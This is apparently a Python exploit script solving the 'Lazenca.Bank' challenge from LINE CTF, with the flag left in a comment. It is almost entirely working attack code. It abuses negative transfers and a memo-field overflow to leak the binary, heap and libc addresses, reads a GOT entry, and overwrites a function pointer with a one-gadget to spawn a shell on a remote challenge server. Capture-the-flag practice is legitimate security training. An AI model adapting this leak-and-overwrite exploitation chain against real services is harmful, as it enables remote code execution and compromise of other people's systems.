#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './Lazenca.Bank'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'35.200.24.227', 'port':10002})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.31.so')
env.set_item('offset_onegadget', debug = 0xe6af4, local = 0xe6af4, remote = 0xe6c84)
env.select()

#==========

binf = ELF(bin_file)
offset_vip_transfar = 0x3456

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_setvbuf     = libc.sep_function['setvbuf']

#==========

def attack(conn, **kwargs):
    bk = Bank(conn)

    bk.add_user('A', 'a')
    bk.add_user('B', 'b')

    bk.login('B', 'b')
    an = bk.accounts()[0]
    bk.logout()

    bk.login('A', 'a')
    for _ in range(20):
        bk.transfer(an, -10000001)

    bk.user_edit('x'*0x38)

    bk.user_delete()
    bk.add_user('A')
    bk.login('A', 'a')

    part_heap, leak = bk.user_info()
    addr_vip_transfar = u(leak[0x38:])
    binf.address = addr_vip_transfar - offset_vip_transfar
    info('addr_binf_base    = 0x{:08x}'.format(binf.address))
    addr_got_setvbuf    = binf.got['setvbuf']

    addr_heap_base = (binf.address & 0xffffffff00000000) + part_heap - 0x440
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    bk.user_delete()
    bk.add_user('A')
    bk.login('A', 'a')

    bk.user_edit(b'y'*0x58 + p64(addr_got_setvbuf))
    laddr_libc_setvbuf = bk.accounts()[0]
    bk.user_edit(b'z'*0x58 + p64(addr_got_setvbuf+4))
    haddr_libc_setvbuf = bk.accounts()[0]

    addr_libc_setvbuf = (haddr_libc_setvbuf << 32) + laddr_libc_setvbuf
    libc.address = addr_libc_setvbuf - offset_libc_setvbuf
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_onegadget = libc.address + env.offset_onegadget
    bk.user_edit(b'z'*0x38 + p64(addr_onegadget))

    conn.sendlineafter('Input : ', '8')
    conn.sendlineafter('transfer.\n', str(an))
    conn.sendlineafter('transfer.\n', '0')

class Bank:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter
        self.loggedin = False

    def accounts(self):
        if not self.loggedin:
            return
        self.sendlineafter('Input : ', '1')
        return list(map(int, re.findall(r'number : (\d+)', self.recvuntil('Menu').decode())))

    def transfer(self, account, amount):
        if not self.loggedin:
            return
        self.sendlineafter('Input : ', '3')
        self.sendlineafter('transfer.\n', str(account))
        self.sendlineafter('transfer.\n', str(amount))

    def add_user(self, name, pwd = None):
        self.sendlineafter('Input : ', '6')
        self.sendlineafter('ID : ', name)
        if pwd is not None:
            self.sendlineafter('Password : ', pwd)

    def login(self, name, pwd):
        self.sendlineafter('Input : ', '7')
        self.sendlineafter('ID : ', name)
        self.sendlineafter('Password : ', pwd)
        self.loggedin = True

    def user_info(self):
        if not self.loggedin:
            return
        self.sendlineafter('Input : ', '7')
        self.sendlineafter('Input : ', '1')
        an = int(re.search(r'Account Number : (\d+)', self.recvuntil('\nMemo : ').decode()).group(1))
        memo = self.recvuntil('\n\n1.Info', drop=True)
        self.sendlineafter('Input : ', '0')
        return an, memo

    def user_edit(self, memo):
        if not self.loggedin:
            return
        self.sendlineafter('Input : ', '7')
        self.sendafter('Input : ', '2')
        self.sendline(memo)
        self.sendlineafter('Input : ', '0')

    def user_delete(self):
        if not self.loggedin:
            return
        self.sendlineafter('Input : ', '7')
        self.sendlineafter('Input : ', '3')
        self.loggedin = False

    def logout(self):
        if not self.loggedin:
            return
        self.sendlineafter('Input : ', '8')
        self.loggedin = False

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # LINECTF{llllllllazenca_save_u5}

if __name__=='__main__':
    main()

#==========
